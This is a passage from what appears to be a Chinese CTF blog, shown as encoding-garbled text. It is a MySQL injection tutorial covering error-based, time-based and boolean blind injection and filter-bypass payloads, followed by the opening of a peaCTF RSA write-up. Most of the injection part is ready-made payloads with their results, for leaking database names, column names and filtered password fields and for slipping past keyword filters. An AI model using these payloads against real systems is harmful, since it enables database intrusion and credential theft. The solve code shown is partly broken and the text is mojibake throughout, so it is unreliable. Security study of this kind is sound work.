|</code></pre><p>æˆ‘ä»¬ä½¿ç”¨count()å’Œgroup by æ¥å¯¹ç»“æœè¿›è¡Œç»Ÿè®¡ï¼Œè¿™é‡Œä¸åŠ ç§å­ã€‚</p><pre><code>select count(*) from information_schema.tables group by floor(rand()*2);+----------+| count(*) |+----------+|       47 ||       50 |+----------+</code></pre><p>ç»è¿‡æµ‹è¯•å‘ç°ä¸åŠ ç§å­ä¹Ÿæœ‰å‡ºç°æŠ¥é”™çš„å‡ ç‡ï¼Œä½†æ˜¯æˆ‘ä»¬åŠ ä¸Šç§å­ä¹‹åå¿…ç„¶ä¼šæŠ¥é”™ã€‚åœ¨äº†è§£åŸå› ä¹‹å‰æˆ‘ä»¬è¿˜è¦å†äº†è§£ä¸€ä¸‹count()å‡½æ•°</p><ul><li>count()</li></ul><p>åœ¨è¿›è¡Œcountæ—¶å¯¹æŸ¥åˆ°çš„æ•°æ®ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿè¡¨ç”¨æ¥ä¿å­˜ç»“æœã€‚å¦‚æœkeyçš„ç»“æœåœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨åˆ™countçš„ç»“æœåŠ ä¸€ï¼Œå¦åˆ™å°±æ’å…¥æ–°çºªå½•ã€‚</p><p>ç”±ä¸Šæ–‡å¯çŸ¥ï¼Œfloor(rand(0)*2)çš„ç»“æœæ˜¯å›ºå®šçš„â€™011011â€™ï¼Œæ‰€ä»¥æŠ¥é”™çš„åŸå› åº”è¯¥æ˜¯floor(rand(0)*2)çš„å¤šæ¬¡è®¡ç®—å¯¼è‡´çš„ã€‚</p><pre><code>floor(rand(0*2)        0110110            æŸ¥åˆ°0ï¼Œè™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œæ‰§è¡Œæ’å…¥1            æ’å…¥insert floor(rand(0)*2) into tablename;æ’å…¥æ—¶å†æ¬¡è°ƒç”¨å‡½æ•°ä¹Ÿå°±æ˜¯è¯´æ’å…¥çš„æ˜¯11            è¡¨ä¸­å­˜åœ¨,count+10            æŸ¥åˆ°0ï¼Œä¸å­˜åœ¨ï¼Œè¿›è¡Œæ’å…¥1            æ’å…¥insert floor(rand(0)*2) into tablename;æ’å…¥æ—¶å†æ¬¡è°ƒç”¨å‡½æ•°ä¹Ÿå°±æ˜¯è¯´æ’å…¥çš„æ˜¯11            æŠ¥é”™key            count1            1+11            æŠ¥é”™</code></pre><p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸¤ä¸ªç›¸åŒçš„keyï¼Œä¸»é”®å”¯ä¸€çš„ï¼Œæ‰€ä»¥æŠ¥é”™ã€‚è¡¨é‡Œæœ‰å¤§äºç­‰äºä¸‰æ¡æ•°æ®æ—¶å°±ä¼šæŠ¥é”™ã€‚</p><p>é‚£å‰é¢è¯´çš„ä¸åŠ ç§å­ä¹Ÿæœ‰å‡ ç‡æŠ¥é”™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p>å…¶å®åªè¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶å°±å¯ä»¥æŠ¥é”™</p><pre><code>æŸ¥è¯¢              è™šæ‹Ÿè¡¨æ’å…¥ç¬¬ä¸€æ¬¡è®¡ç®—         ç¬¬äºŒæ¬¡è®¡ç®—ç¬¬ä¸‰æ¬¡è®¡ç®—         ç¬¬å››æ¬¡è®¡ç®—</code></pre><p>åªè¦ç¬¬ä¸‰æ¬¡ç»“æœä¸ç¬¬äºŒç¬¬å››éƒ½ä¸åŒï¼ŒåŒæ—¶ç¬¬äºŒç¬¬å››è®¡ç®—ç›¸åŒå³å¯</p><p>æˆ‘ä»¬æ„é€ ä¸‹é¢çš„è¯­å¥</p><pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</code></pre><p>æˆåŠŸè¿”å›ä¿¡æ¯</p><p>å¦‚æœä¸æºå¸¦uesr()ï¼ŒæŠ¥çš„æ˜¯11ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯concat()å‡½æ•°éƒ¨åˆ†æ‰§è¡Œäº†è¯­å¥</p><pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &apos;11&apos; for key &apos;group_key&apos;</code></pre><ul><li>å…¶ä»–å‡½æ•°</li></ul><p>updataxml()</p><pre><code>select * from user where username = &apos;admin&apos; or updatexml(1,concat(0x7e,(database())),0);ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><p>å› ä¸ºç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼ï¼Œè¾“å…¥ä¸ç¬¦åˆå°±æŠ¥é”™ï¼Œæœ€å¤§é•¿åº¦ä¸º32ä½,extractvalue()ä¹Ÿæ˜¯å¦‚æ­¤</p><p>extractvalue()</p><pre><code>select * from user where username = &apos;admin&apos; and extractvalue(1,concat(0x7e,(select database())))ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>ä¸»è¦ä¸¤ç§ï¼Œå³ <strong>æ—¶é—´ç›²æ³¨</strong> ï¼Œ <strong>å¸ƒå°”ç›²æ³¨</strong></p><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>*<em>å‡½æ•° *</em> </p><p>sleep() ç¡çœ æ—¶é—´ä¸ºå‚æ•°è®¾å®šçš„ç§’æ•°ï¼Œç„¶åè¿”å›0ã€‚è‹¥sleep()è¢«ä¸­æ–­ï¼Œè¿”å›1ã€‚<br>å‡å¦‚è¿™é‡Œæˆ‘ä»¬æœ‰ä¸€å¼ è¡¨</p><pre><code>mysql&gt; select * from user;+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p>æˆ‘ä»¬å°è¯•æŸ¥è¯¢ä¸€æ¡æ•°æ®å¹¶è®¾ç½®æ—¶é—´ä¸º3s</p><pre><code>select * from user where id = 1 and sleep(3);Empty set (3.00 sec)</code></pre><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå»¶æ—¶äº†3s.å¦‚æœæˆ‘ä»¬æŸ¥ä¸€æ¡è¡¨é‡Œä¸å­˜åœ¨çš„æ•°æ®ï¼Œåˆ™ä¼šç›´æ¥è¿”å›ï¼Œä¸æ‰§è¡Œsleep()ã€‚</p><pre><code>select * from user where id = 9999 and sleep(3);Empty set (0.00 sec)</code></pre><p>andå‰é¢çš„æ¡ä»¶ä¸ºå‡ï¼Œåé¢çš„å°±ä¸å†çœ‹äº†ã€‚åŒæ ·çš„æˆ‘ä»¬æµ‹è¯•or</p><pre><code>select * from user where id = 1 or sleep(3);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | 1234567  |+----+----------+----------+1 row in set (15.01 sec)</code></pre><p>å‘ç°æ—¶é—´ä¸º15s,æˆ‘ä»¬å¯ä»¥æƒ³æƒ³è¡¨é‡Œä¸€å…±æœ‰6æ¡æ•°æ®ï¼ŒæŸ¥åˆ°ç¬¬ä¸€æ¡æ•°æ®æ—¶id=1ä¸ºçœŸï¼Œæ­¤æ—¶oråé¢çš„è¡¨è¾¾å¼ä¸å†èµ·ä½œç”¨ï¼Œå‰©ä¸‹çš„äº”æ¡æ•°æ®éƒ½ä¸ºå‡ï¼Œæ‰§è¡Œ5æ¬¡sleep(3),å› æ­¤æ—¶é—´ä¸º15sã€‚</p><p>*<em>é…åˆifæ¡ä»¶è§¦å‘ *</em></p><p>if(expr1,expr2,expr3)<br>å¦‚æœexpr1æ˜¯TRUE(expr1&lt;&gt;0 and expr1&lt;&gt; NULL),åˆ™IF()çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›å€¼æ˜¯expr3ã€‚IF()çš„è¿”å›å€¼ä¸ºæ•°å­—æˆ–åˆ™å­—ç¬¦ä¸²å…·ä½“æƒ…å†µè§†å…¶æ‰€åœ¨è¯­å¢ƒè€Œå®šã€‚</p><p>ç–‘é—® </p><pre><code>mysql&gt; select * from user where id = 7 or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)mysql&gt; select * from user where id = 1 or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p>åœ¨ä¸çŸ¥é“å­—æ®µå€¼çš„æƒ…å†µä¸‹å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•å¾—åˆ°å†…å®¹</p><pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p><strong>å­—ç¬¦ä¸²æˆªå–å‡½æ•°</strong> </p><p>substr(str,postion,lines) ä»strçš„ç¬¬postionä¸ªå­—ç¬¦å¼€å§‹æˆªå–linesé•¿åº¦çš„å­—ç¬¦ã€‚</p><p>substring(str,FROM pos FOR len),è¿™é‡Œå¯ä»¥ä¸ä½¿ç”¨é€—å·ã€‚è¿™ä¸¤ä¸ªå‡½æ•°å¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šé•¿åº¦å°±ä¼šè¿”å›ä»æŸ¥åˆ°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹çš„å‰©ä¸‹æ‰€æœ‰å­—ç¬¦ã€‚</p><p>substring_index(str,å…³é”®å­—ï¼Œå…³é”®å­—å‡ºç°æ¬¡æ•°)ã€‚è¿”å›stræ»¡è¶³å‡ºç°æ¬¡æ•°çš„ä¹‹å‰çš„å­—ç¬¦(å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è´Ÿæ•°åˆ™å€’ç€æ¥)</p><pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(substr((select username from user where id=1),1,1)=&apos;a&apos;,sleep(2),0);Empty set (12.00 sec)</code></pre><p>å¦‚æœid=1çš„è¿™æ¡æ•°æ®ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºâ€™aâ€™ï¼Œåˆ™sleep2s.</p><pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);Empty set (2.00 sec)</code></pre><p>é€å­—ç¬¦æŸ¥è¯¢æ•°æ®åº“åã€‚</p><p><strong>é…åˆ case whenâ€¦thenâ€¦elseâ€¦end è§¦å‘</strong> </p><pre><code> select case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end from user;+----------------------------------------------------------+| case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end |+----------------------------------------------------------+| admin                                                    || xxx                                                      || xxx                                                      || admin                                                    || admin                                                    || admin                                                    |+----------------------------------------------------------+6 rows in set (0.00 sec)</code></pre><p><strong>é™¤äº†sleepä¹‹å¤–çš„å‡½æ•°</strong></p><p><strong>BENCHMARK(count,expr)</strong></p><p>BENCHMARK()å‡½æ•°é‡å¤countæ¬¡æ‰§è¡Œexprã€‚å®ƒå¯ä»¥è¢«ç”¨äºè®¡ç®—MYSQLå¤„ç†è¡¨è¾¾å¼çš„é€Ÿåº¦ã€‚ç»“æœå€¼é€šå¸¸ä¸º0ã€‚</p><pre><code>select benchmark(10000000,sha(1));</code></pre><p>æˆ‘ä»¬ç»“åˆä¸Šé¢çš„è¯­å¥</p><pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><p>*<em>ç¬›å¡å°”ç§¯ *</em></p><pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>é€šè¿‡è®¡ç®—æ¥å»¶æ—¶</p><pre><code>mysql&gt; select count(*) from user;+----------+| count(*) |+----------+|        6 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from user A,user B;+----------+| count(*) |+----------+       36 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from user A,user B,user C;+----------+| count(*) |+----------+|      216 |+----------+1 row in set (0.00 sec)ä¾‹å¦‚ï¼šselect * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.columns C),null);</code></pre><p>*<em>GET_LOCK *</em></p><p>GET_LOCK(str,timeout)</p><p>è®¾æ³•ä½¿å­—ç¬¦ä¸²strç»™å®šçš„åå­—å¾—åˆ°ä¸€ä¸ªé”ï¼Œè¶…æ—¶ä¸ºtimeoutç§’.</p><p>select GET_LOCK(â€˜aâ€™,1)</p><p>ä½†æ˜¯ä¸Šé”åå¿…é¡»åœ¨ä½¿ç”¨é•¿è¿æ¥èƒ½å¼€å¯ä¸¤ä¸ªä¼šè¯çš„æ—¶å€™æ‰èµ·ä½œç”¨ã€‚</p><p>*<em>RLIKE *</em></p><p>é€šè¿‡rpadæˆ–repeat æ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„patternï¼Œé€šè¿‡repeatçš„å‚æ•°æ§åˆ¶å»¶æ—¶é•¿çŸ­ã€‚</p><p>   <code>select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</code></p><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p><strong>å‡½æ•°</strong> </p><p>æˆªå–å‡½æ•°</p><pre><code>mid(column_name,start[,length])mysql&gt; select mid(&apos;abc&apos;,1,1);+----------------+| mid(&apos;abc&apos;,1,1) |+----------------+| a              |+----------------+1 row in set (0.00 sec)left(str,lengt) ä»å·¦å¼€å§‹æˆªå–å­—ç¬¦ä¸²right(str,length) ä»å³æˆªå– mysql&gt; select right(&apos;abcda&apos;,3);+------------------+| right(&apos;abcda&apos;,3) |+------------------+| cda              |+------------------+1 row in set (0.00 sec)è½¬asciiç±»å‹ascii(str)/ord(str)  è¿”å›å­—ç¬¦ä¸²é¦–å­—æ¯çš„asciiå€¼</code></pre><p>å¸ƒå°”ç›²æ³¨ä¸æ—¶é—´ç›²æ³¨å·®åˆ«ä¸å¤§</p><p>å¸¸ç”¨payload </p><pre><code>ascii(substr((select password from user) from 1 for 1))&lt;127</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="å…³é”®è¯è¿‡æ»¤"><a href="#å…³é”®è¯è¿‡æ»¤" class="headerlink" title="å…³é”®è¯è¿‡æ»¤"></a>å…³é”®è¯è¿‡æ»¤</h3><p>å¯¹äºæŸäº›ç‰¹å®šå…³é”®è¯è¿‡æ»¤æ¯”å¦‚ from,union,selectç­‰æˆ‘ä»¬å¯ä»¥é€šè¿‡åŒå†™æˆ–å¤§å°å†™æ··å†™è¿›è¡Œç»•è¿‡ã€‚</p><p>ç©ºæ ¼ç»•è¿‡ï¼š /**/ /*!*/  %09 %0A %0B %0C %0D %A0 %20</p><p>åœ¨å®é™…ä½¿ç”¨ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨1ä¸ª<code>*/</code>æ¥é—­åˆå¤šä¸ª<code>/*!</code>.</p><pre><code>SELECT * from users where id = 1/*!union/*!select/*!1,(select/*!password/*!from/*!users/*!limit/*!1,1),3*/;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb         | Dumb      ||  1 | I-kill-you | 3         |+----+------------+----------+</code></pre><p>å‡½æ•°æ›¿æ¢ï¼š</p><pre><code>mid(&apos;aaa&apos;,1,1) &lt;==&gt; left(&apos;aaa&apos;,1) &lt;==&gt; substr(&apos;aaa&apos;,1,1) &lt;==&gt; substring(&apos;aaa&apos;,1,1)concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt; group\_concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt;  concat\_ws(&apos;b&apos;,&apos;a&apos;,&apos;c&apos;)</code></pre><p>é€—å·ç»•è¿‡ï¼š</p><p>union select è”åˆæŸ¥è¯¢çš„é€—å·è¢«è¿‡æ»¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>join</code>è¿›è¡Œæ³¨å…¥</p><pre><code>select * from emails where id = 1.1 union select * from (select 1)a join (select 2)b;</code></pre><p>å­—ç¬¦ä¸²æˆªå–å‡½æ•°ä¸­çš„é€—å·ç»•è¿‡</p><p>m<code>id(&#39;abc&#39; from 1 for 1) &lt;==&gt; substr(&#39;abc&#39; from 1 for 1) &lt;==&gt; substring(&#39;abc&#39; from 1 for 1)</code></p><p>Limitä¸­é€—å·ç»•è¿‡</p><pre><code>select * from emails limit 1,1; &lt;==&gt; select * from emails limit 1 offset 1;</code></pre><p><code>=</code>ç»•è¿‡</p><p>å¯ä»¥ç”¨likeã€regexpã€rlikeã€inã€betweenâ€¦andâ€¦ç»•è¿‡</p><p>æ¯”è¾ƒç¬¦ç»•è¿‡<br>ï¼= &lt;==&gt; &lt;&gt;</p><h3 id="å…³é”®å‡½æ•°è¿‡æ»¤"><a href="#å…³é”®å‡½æ•°è¿‡æ»¤" class="headerlink" title="å…³é”®å‡½æ•°è¿‡æ»¤"></a>å…³é”®å‡½æ•°è¿‡æ»¤</h3><p>å¦‚æœè¿‡æ»¤äº†<code>information</code>å…³é”®å­—æ— æ³•ä½¿ç”¨<code>information_schema.tables</code>ç­‰è¡¨çš„è¯æˆ‘ä»¬å¯ä»¥é€šè¿‡innodbå¼•æ“è¿›è¡Œæ³¨å…¥ã€‚ åœ¨Mysql5.6ä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œç³»ç»ŸMysqlåº“ä¸­å­˜åœ¨ä¸¤å¼ ä¸innodbç›¸å…³çš„è¡¨ <code>innodb_table_stats</code> å’Œ <code>innodb_index_stats</code>ã€‚</p><pre><code>select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</code></pre><p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„è‡ªå®šä¹‰å‡½æ•°æ¥è·å¾—æ•°æ®åº“å</p><pre><code>select * from users where id=haa();ERROR 1305 (42000): FUNCTION security.haa does not exist</code></pre><p>çˆ†åˆ—åä½¿ç”¨<code>polygon</code>å’Œ<code>linestring</code>å‡½æ•°ã€‚ç¿»é˜…æ–‡æ¡£å¯çŸ¥</p><blockquote><p>Constructs a Polygon value from a number of LineString or WKB LineString arguments. If any argument does not represent a LinearRing (that is, not a closed and simple LineString), the return value is NULL. </p></blockquote><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥å­˜åœ¨å­—æ®µçš„è¯å°±ä¼šçˆ†å‡ºåº“ï¼Œè¡¨ï¼Œåˆ—ã€‚</p><pre><code>mysql&gt; select * from users where id=1 and polygon(id);ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsingmysql&gt; select * from users where id=1 and linestring(id);ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing</code></pre><p>çˆ†å­—æ®µåæˆ‘ä»¬é€šè¿‡å‘½ååˆ«åçš„æ–¹å¼ã€‚ä½¿ç”¨åˆ«åçš„æ—¶å€™è¡¨ä¸­ä¸èƒ½å‡ºç°ç›¸åŒçš„å­—æ®µåï¼Œäºæ˜¯æˆ‘ä»¬å°±åˆ©ç”¨joinæŠŠè¡¨æ‰©å……æˆä¸¤ä»½ï¼Œåœ¨æœ€ååˆ«åcçš„æ—¶å€™ æŸ¥è¯¢åˆ°é‡å¤å­—æ®µï¼Œå°±æˆåŠŸæŠ¥é”™ï¼Œä»è€Œçˆ†å‡ºå­—æ®µåï¼Œå†ä½¿ç”¨<code>using</code>å‡½æ•°ä»¥æ­¤çˆ†å‡ºå…¶ä»–å­—æ®µåã€‚</p><pre><code>mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)as c);ERROR 1060 (42S21): Duplicate column name &apos;id&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c);ERROR 1060 (42S21): Duplicate column name &apos;username&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c);ERROR 1060 (42S21): Duplicate column name &apos;password&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username,password))as c);ERROR 1241 (21000): Operand should contain 1 column(s)</code></pre><p>å¦‚æœè¿‡æ»¤äº†å­—æ®µåï¼Œæ¯”å¦‚ password æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•å¾—åˆ°æ•°æ®</p><pre><code>mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;+------------+| 3           |+------------+| 3           || Dumb        || I-kill-you || p@ssword   || crappy      || stupidity  || genious     || mob!le      || admin       || admin1      || admin2      || admin3      || dumbo       || admin4      || 789          |+------------+mysql&gt; select * from users where id=1 union select 1,(select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 2),3;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb         | Dumb      ||  1 | I-kill-you | 3         |+----+------------+----------+</code></pre><p>åŸç†æ˜¯é€šè¿‡å»ºç«‹è™šè¡¨eï¼Œè™šè¡¨eé‡Œçš„ç¬¬ä¸‰åˆ—å‚¨å­˜äº†passwordå­—æ®µä¿¡æ¯ï¼Œæˆ‘ä»¬é€šè¿‡åç§»æ¥ä½¿è¯¥å­—æ®µä¿¡æ¯æ˜¾ç¤ºåœ¨æ²¡è¢«è¿‡æ»¤çš„usernameå­—æ®µä¸­ã€‚</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç›²æ³¨</p><p>ç°åœ¨æˆ‘ä»¬çš„è¡¨é‡Œæœ‰ä¸€æ¡æ•°æ®</p><pre><code>mysql&gt; select * from users where id=15;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789  |+----+----------+----------+</code></pre><p>æˆ‘ä»¬é€šè¿‡ç›²æ³¨çš„æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ã€‚</p><pre><code>mysql&gt; select * from users where id=15 union select 1,2,0x38 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 2        | 8        || 15 | admin#   | 789      |+----+----------+----------+2 rows in set (0.00 sec)    mysql&gt; select * from users where id=15 union select 1,2,0x37 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789  ||  1 | 2| 7|+----+----------+----------+2 rows in set (0.00 sec)mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789      ||  1 | 2        | 6        |+----+----------+----------+2 rows in set (0.00 sec)</code></pre><p>order by 3 desc è¡¨ç¤ºå¯¹ç¬¬ä¸‰æ è¿›è¡Œé™åºæ’åˆ—ã€‚è€Œmysqlåœ¨æ¯”è¾ƒçš„æ—¶å€™æ˜¯ä»å·¦åˆ°å³æŒ‰ç…§å­—ç¬¦çš„ASCIIç æ¥æ¯”è¾ƒã€‚</p><p>ä»ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹å‡ºunion select 0x38 æ—¶username å›æ˜¾2,union select 0x37 æ—¶username å›æ˜¾ admin#,union select 0x36æ—¶ username å›æ˜¾admin#,ä¹Ÿå°±æ˜¯è¯´passwordçš„ç¬¬ä¸€ä½æ˜¯0x37ï¼Œä¹Ÿå°±æ˜¯7.äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å†™è„šæœ¬æ¥çˆ†ç ´è¿™ä¸ªä½ç½®çš„å€¼ã€‚</p><p>å‚è€ƒé“¾æ¥</p><blockquote><p><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a></p><p><a href="https://xz.aliyun.com/t/5505#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5505#toc-3</a></p><p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peaCTF WP</title>
      <link href="/2019/07/26/peaCTF-WP/"/>
      <url>/2019/07/26/peaCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>å’ŒåŒå­¦æŠ¥åäº†è¿™ä¸ªæ¯”èµ›ï¼Œå…¨è‹±æ–‡æœç„¶æœ‰å‹åŠ›ï¼ŒåŠå¤©æ‰¾ä¸åˆ°æ€ä¹ˆç­”é¢˜ï¼Œå“­äº†ğŸ˜­</p><a id="more"></a><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>é¢˜ç›®æè¿°ï¼šCan you help Bob retrieve the two messages for a flag? Authenticated Channel Encrypted Channel</p><p>ç»™äº†ä¸¤ä¸ªæ–‡ä»¶ auth_channel.txt å’Œ  enc_channel.txt</p><pre><code>Authenticated (unhashed) channel:n = 59883006898206291499785811163190956754007806709157091648869e = 65537c = 23731413167627600089782741107678182917228038671345300608183Encrypted channel:n = 165481207658568424313022356820498512502867488746572300093793e = 65537c = 150635433712900935381157860417761227624682377134647578768653</code></pre><p>å…ˆåˆ†è§£ä¸¤ä¸ªnå¾—åˆ°ä¸¤å¯¹p&amp;q</p><pre><code>p = 192355607880290234740980693973q = 311314068553039667905603427153p1 = 404796306518120759733507156677q1 = 408801179738927870766525808109</code></pre><p>å¯¹ä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«è¿›è¡Œå¸¸è§„è§£å¯†</p><pre><code>import gmpy2n1 = 165481207658568424313022356820498512502867488746572300093793e1 = 65537c1 = 150635433712900935381157860417761227624682377134647578768653p1 = 404796306518120759733507156677q1 = 408801179738927870766525808109phin1 = (p-1)*(q-1)d1 = gmpy2.invert(e,phin)m1 = gmpy2.powmod(c,d,n)print mflag = hex(m)[2:]print flag.decode(&apos;hex&apos;)</code></pre><p>å‘ç°åªæœ‰ç¬¬äºŒä¸ªæ–‡ä»¶å¯ä»¥æ­£å¸¸è§£å¯†</p><pre><code>8904929771347223901285886734450peaCTF{f4ct0r</code></pre><p>ç¬¬ä¸€ä¸ªæ–‡ä»¶æŠ¥é”™ï¼Œå¥‡æ•°é•¿åº¦æ— æ³•æ­£å¸¸decodeã€‚</p><p>è¿™ä¸ªåœ°æ–¹å¡äº†ä¸€ä¼šï¼Œè¿˜å°è¯•æ‹¼æ¥äº†ä¸¤æ®µmï¼Œå“ˆå“ˆã€‚</p><p>æœ€åçœ‹æ–‡ä»¶åå‘ç°æ˜¯authï¼Œæƒ³åˆ°RSAæ•°å­—ç­¾åï¼Œå°è¯•æ•°å­—ç­¾åè§£ï¼Œæ‰“å°å‡ºpowçš„16è¿›åˆ¶æ•°æ®ååœ¨æ•°æ®æœ€åæœ‰ä¸€ä¸ªå¤§å†™çš„L<code>0x316e67317366756e7dL</code>ï¼Œé‚åˆ æ‰ã€‚å°†æ–°å¾—åˆ°çš„æ•°æ®å†æ¬¡è§£å¯†å¾—åˆ°flagçš„ååŠæ®µã€‚</p><pre><code>peaCTF{f4ct0r1ng1sfun}</code></pre><h2 id="The-Wondeful-Wizard"><a 